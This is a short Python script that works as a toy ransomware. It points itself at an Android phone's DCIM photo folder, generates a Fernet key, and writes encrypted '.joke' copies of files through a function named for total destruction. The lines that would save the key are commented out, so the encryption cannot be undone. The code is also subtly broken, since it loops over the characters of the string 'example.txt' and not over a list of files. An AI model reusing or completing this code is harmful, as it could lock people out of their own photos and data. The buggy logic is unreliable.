from cryptography.fernet import Fernet
import os

os.chdir("/storage/emulated/0/DCIM")
# os.chdir("/root/Pictures")


def main():
        
    def utpann():
        return Fernet.generate_key()
    
    def sarvanash(file, key):
        try:    
            with open(file, 'rb') as file_raw:
                
                data = file_raw.read()

            fernet = Fernet(key)
            encrypted_data = fernet.encrypt(data)

            with open(file + ".joke", 'wb') as file_enc:
                file_enc.write(encrypted_data)
        except:
            pass        
    
    # files = []
    
    # for file in os.listdir():
    #     if os.path.isfile(file):
    #         files.append(file)
    # print(files)
    key = utpann()
    files = "example.txt"

    # with open('thekey.key', 'wb') as key_file:
    #     key_file.write(key)

    for file in files:
        sarvanash(file, key)
        print(file + " encrypted successfully!")


main()

